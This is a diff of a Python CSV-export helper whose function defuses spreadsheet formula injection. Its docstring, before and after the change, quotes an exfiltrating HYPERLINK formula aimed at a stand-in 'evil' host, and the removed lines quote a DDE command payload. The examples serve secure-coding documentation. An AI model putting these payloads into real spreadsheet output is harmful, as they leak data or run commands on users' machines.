@@ -5,7 +5,6 @@ from __future__ import annotations
 import io
 import json
 import platform
-import sys
 import zipfile
 import base64
 from datetime import datetime, timezone
@@ -24,14 +23,9 @@ _FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
 def csv_cell(value: Any) -> str:
     """One CSV cell: quoted where the format needs it, defused where a spreadsheet would run it.
 
-    Activity names come from uploaded logs and reach exported tables unchanged (see
-    ``variant_explorer``), so a cell like ``=HYPERLINK("http://evil/"&A1,"click")`` is evaluated
-    the moment someone opens the export in Excel or LibreOffice. Quoting alone does not prevent
-    that — quotes are a CSV concern, formulas are an application concern.
-
-    Numbers are deliberately exempt: prefixing ``-5`` would turn a legitimate negative value
-    into text and quietly corrupt every export that contains one. ``-2+3+cmd|' /C calc'!A0``
-    does not parse as a number and is prefixed.
+    Table cells can contain names from uploaded logs, so a cell like
+    ``=HYPERLINK("http://evil/"&A1,"click")`` would be evaluated by Excel or LibreOffice.
+    Such cells get a leading apostrophe. Numbers such as ``-5`` are left alone.
     """
     if value is None:
         return ""
